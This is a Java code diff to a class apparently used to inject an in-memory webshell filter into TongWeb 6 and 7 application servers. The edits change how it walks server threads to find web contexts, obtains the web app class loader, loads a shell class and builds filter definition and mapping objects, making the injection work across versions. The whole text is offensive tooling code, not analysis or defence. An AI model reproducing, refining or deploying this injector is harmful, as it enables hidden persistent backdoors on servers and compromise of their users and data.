@@ -44,6 +44,12 @@ public class TongWebFilterInjector {
         }
     }
 
+    /**
+     * com.tongweb.web.thor.core.ThorStandardContext
+     * /opt/tweb6/lib/twnt.jar
+     * com.tongweb.catalina.core.ApplicationContext
+     * /opt/tweb7/lib/tongweb.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -53,18 +59,25 @@ public class TongWebFilterInjector {
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    for (Object context : children.values()) {
-                        contexts.add(context);
-                    }
+                    contexts.addAll(children.values());
                 }
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -86,16 +99,17 @@ public class TongWebFilterInjector {
         Object filterDef;
         Object filterMap;
         Constructor<?> constructor;
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
             // tongweb 7
-            filterDef = Class.forName("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
-            filterMap = Class.forName("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
-            constructor = Class.forName("com.tongweb.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
+            filterDef = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
+            filterMap = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
+            constructor = contextClassLoader.loadClass("com.tongweb.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
         } catch (Exception e2) {
             // tongweb 6
-            filterDef = Class.forName("com.tongweb.web.thor.deploy.FilterDef").newInstance();
-            filterMap = Class.forName("com.tongweb.web.thor.deploy.FilterMap").newInstance();
-            constructor = Class.forName("com.tongweb.web.thor.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
+            filterDef = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterDef").newInstance();
+            filterMap = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterMap").newInstance();
+            constructor = contextClassLoader.loadClass("com.tongweb.web.thor.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
         }
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
         invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
